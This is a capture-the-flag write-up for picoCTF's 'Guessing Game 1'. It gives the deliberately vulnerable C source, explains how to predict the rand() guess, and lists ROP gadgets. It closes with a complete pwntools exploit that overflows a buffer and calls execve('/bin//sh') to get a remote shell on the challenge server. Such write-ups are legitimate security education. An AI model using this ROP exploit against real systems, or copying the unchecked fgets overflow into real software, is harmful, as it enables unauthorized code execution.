# Guessing Game 1

## Source Code

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define BUFSIZE 100


long increment(long in) {
	return in + 1;
}

long get_random() {
	return rand() % BUFSIZE;
}

int do_stuff() {
	long ans = get_random();
	ans = increment(ans);
	int res = 0;
	
	printf("What number would you like to guess?\n");
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);
	
	long g = atol(guess);
	if (!g) {
		printf("That's not a valid number!\n");
	} else {
		if (g == ans) {
			printf("Congrats! You win! Your prize is this print statement!\n\n");
			res = 1;
		} else {
			printf("Nope!\n\n");
		}
	}
	return res;
}

void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	fgets(winner, 360, stdin);                   // <- Buffer Overflow
	printf("Congrats %s\n\n", winner);
}

int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	
	int res;
	
	printf("Welcome to my guessing game!\n\n");
	
	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}
	
	return 0;
}
```

## Overview & Idea

- Let's check the infomations of binary

![img](/picoCTF/guessing_game_1/assets/info_chall.png)

- And watch soure code above, we can see that in win function, it has buffer overflow vulnerability, which we can exploit to get the shell. And it's possible because program has no PIE :3. This challenge we'll use ROP to get the shell.

## Detail

- Before we can get into win function, we must pass the do_stuff function with return of this function is not equal 0. To do that, we must type exactly what value of ans in do_stuff function is.
- The ans use rand() to generate random value, but we can find exactly what that value is because rand() just generate pseudo-random number, it basically uses time to generate the value.
- Note that the time when the program start then generated the value of ans is independant, we do not affect this period of time, so it's a fixed value. And with some script, I found it is 84 (local and server has the same this value)

```python
from pwn import *

payload = 0

while (True):
    p = remote("jupiter.challenges.picoctf.org", 28953)
    p.recvuntil("What number would you like to guess?\n")
    p.sendline(str(payload).encode('utf-8'))
    s = p.recvline()
    if ("Congrats!" in s):
        break
    payload += 1
    p.close()
print(payload)
p.interactive()
```

- So, we can ignored this do_stuff function and move to win function, which we'll use to get shell.

- This program has statically linked, so it can have some gadget that we can use to ROP to excecute exceve("/bin/sh", 0, 0).

- After use some command of ROPgadget, I found this

```
0x00000000004163f4   : pop rax ; ret      rax <- 0x3b 
0x0000000000400696   : pop rdi ; ret      rdi <- "/bin/sh"
0x0000000000410ca3   : pop rsi ; ret      rsi <- 0
0x000000000044a6b5   : pop rdx ; ret      rdx <- 0
0x000000000040137c   : syscall
```

- Unfortunately, the binary does not have "/bin/sh" string, so we must find some gadget to overwrite to data segment.

```
0x000000000048dd72   : mov dword ptr [rax], edx ; ret
```

- We must choose the clean data segment, that does not have any weird value in that segment. And I found it is `0x6b760c`
- To overwrite the `0x6b760c`, we take advantage of pointer. Which in C code is

```
int *p = (int*) 0x6b760c    // Assume that after 0x6b7610 is 0x00000000
*p = 0x6e69622f             // 'nib/' -> '/bin'
*(p + 1) = 0x68732f2f       // 'hs//' -> '//sh'

// -> printf("%s", (char*)0x6b76c);   will print the "/bin//sh"
```
- With ROP, I implement it with reference the address hold in eax, and change it to value of edx.

```
pop     rax  ; After this instruction on stack is 0x6b760c
ret

pop     rdx  ; After this instruction on stack is '/bin', it's '/bin' because of little endian 
ret

mov     dword ptr [rax], edx
ret

pop     rax  ; After this instruction on stack is 0x6b7610
ret

pop     rdx  ; After this instruction on stack is '//sh'
ret

mov     dword ptr [rax], edx
ret

|           . . . . . . .
|   +--------------------------+    <- esp
|   | pop   rax                |
|   | ret                      |
|   +--------------------------+
|   |        0x6b760c          |
|   +--------------------------+
|   | pop   rdx                |
|   | ret                      |
|   +--------------------------+
|   |        '/bin'            |
S   +--------------------------+
t   | mov  dword ptr [rax],edx |
a   | ret                      |
c   +--------------------------+
k   | pop   rax                |
|   | ret                      |
|   +--------------------------+
|   |        0x6b7610          |
|   +--------------------------+
|   | pop   rdx                |
|   | ret                      |
|   +--------------------------+
|   |        '//sh'            |
|   +--------------------------+
|   | mov  dword ptr [rax],edx |
|   | ret                      |
|   +--------------------------+
|          . . . . . . .
```

- After implement above ROP, the 0x6b760c will reference to "/bin//sh"

- And Finally, We have to set up some parameter to implement call to exceve

```
|           . . . . . . 
|   +-------------------------+         <- esp
|   |        pop   rax        |
|   |        ret              |
|   +-------------------------+
|   |        0x3b             |
|   +-------------------------+
S   |        pop   rdi        |
t   |        ret              |
a   +-------------------------+
c   |        0x6b760c         |
k   +-------------------------+
|   |        pop   rsi        |
|   |        ret              |
|   +-------------------------+
|   |        pop   rdx        |
|   |        ret              |
|   +-------------------------+
|           . . . . . . 
```


## Exploit

```python
from pwn import *

mov_data = 0x000000000048dd72   #: mov dword ptr [rax], edx ; ret
pop_rax  = 0x00000000004163f4   #: pop rax ; ret
pop_rbx  = 0x0000000000400ed8   #: pop rbx ; ret
pop_rdx  = 0x000000000044a6b5   #: pop rdx ; ret
pop_rdi  = 0x0000000000400696   #: pop rdi ; ret
mov_rcx  = 0x0000000000444fd0   #: mov rcx, qword ptr [rsi] ; mov byte ptr [rdi + 8], dh ; mov qword ptr [rdi], rcx ; ret
pop_rsi  = 0x0000000000410ca3   #: pop rsi ; ret
syscall  = 0x000000000040137c   #: syscall

#  elf = ELF("./vuln")
#  p = elf.process()
p  = remote("jupiter.challenges.picoctf.org", 28953)
#  gdb.attach(p)

p.recvuntil("What number would you like to guess?\n")
p.sendline("84")

# data section address 0x6b7000 (+ 0x60c for safety overwrite)
data_addr = 0x6b760c

padding = "a"*120
payload = padding
payload += p64(pop_rax)
payload += p64(data_addr)
payload += p64(pop_rdx)
payload += "/binabcd"               #<- abcd is padding
payload += p64(mov_data)

payload += p64(pop_rax)
payload += p64(data_addr + 4)
payload += p64(pop_rdx)
payload += "//shefgh"               #<- efgh is padding
payload += p64(mov_data)

payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(pop_rdi)
payload += p64(data_addr)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)

p.sendline(payload)
p.interactive()
```

## Result

![img](/picoCTF/guessing_game_1/assets/result.png)